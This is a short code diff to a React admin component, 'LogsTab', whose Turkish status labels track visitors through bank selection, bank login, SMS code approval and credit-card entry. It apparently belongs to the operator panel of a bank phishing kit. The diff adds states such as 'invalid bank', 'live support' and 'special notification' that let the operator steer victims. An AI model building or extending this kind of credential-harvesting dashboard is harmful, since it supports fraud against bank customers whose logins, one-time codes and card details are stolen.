@@ -416,11 +416,17 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 }
                 else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-400 bg-blue-500/10"; }
                 else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-400 bg-yellow-500/10"; }
-                else if (s === "bank_login") { stepText = "BANKA GİRİŞİ"; stepColor = "text-orange-400 bg-orange-500/10"; }
+                else if (s === "bank_login") { 
+                  stepText = `BANKA GİRİŞİ ${fd.bankName ? `(${fd.bankName})` : ""}`; 
+                  stepColor = "text-orange-400 bg-orange-500/10"; 
+                }
                 else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-400 bg-indigo-500/10"; }
                 else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-400 bg-purple-500/10"; }
                 else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-400 bg-gray-500/10"; }
                 else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-400 bg-green-500/10"; }
+                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-400 bg-red-500/10"; }
+                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-400 bg-cyan-500/10"; }
+                else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM"; stepColor = "text-fuchsia-400 bg-fuchsia-500/10"; }
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/5' : 'hover:bg-gray-50'} transition-colors`}>
